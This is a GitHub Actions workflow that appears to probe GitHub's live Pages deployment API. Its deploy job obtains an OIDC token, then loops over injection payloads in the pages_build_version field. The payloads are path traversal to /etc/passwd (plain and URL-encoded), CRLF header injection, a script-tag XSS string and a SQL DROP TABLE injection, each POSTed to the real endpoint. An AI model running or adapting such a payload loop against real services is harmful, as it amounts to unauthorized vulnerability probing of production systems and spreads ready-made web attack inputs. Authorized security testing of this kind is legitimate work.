name: Deploy Pages
on:
  push:
    branches: [main]
permissions:
  contents: read
  pages: write
  id-token: write
concurrency:
  group: pages
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          mkdir out
          echo "<h1>m15</h1>" > out/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: out
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - name: Deploy with weird build_version
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          OIDC=$(curl -sSL -X GET -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://github.com/fox32932")
          OIDC_TOKEN=$(echo "$OIDC" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
          
          # Get this run's artifact ID
          ARTIFACT_ID=$(curl -s -H "Authorization: bearer $GH_TOKEN" "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$GITHUB_RUN_ID/artifacts" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d['artifacts'][0]['id'])")
          echo "artifact_id: $ARTIFACT_ID"
          
          for VER in \
            "../../../etc/passwd" \
            "abc%2F..%2F..%2Fetc%2Fpasswd" \
            "$(echo -e 'aaaa\r\nX-Injected: 1')" \
            "<script>alert(1)</script>" \
            "abc'; DROP TABLE deployments;--" \
          ; do
            echo "=== build_version: $VER ==="
            BODY=$(printf '{"artifact_id":%s,"pages_build_version":"%s","oidc_token":"%s"}' "$ARTIFACT_ID" "$VER" "$OIDC_TOKEN")
            curl -sS -X POST \
              -H "Authorization: bearer $GH_TOKEN" \
              -H "Accept: application/vnd.github+json" \
              "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" \
              -d "$BODY" \
              -w "\nHTTP %{http_code}\n"
            sleep 1
          done
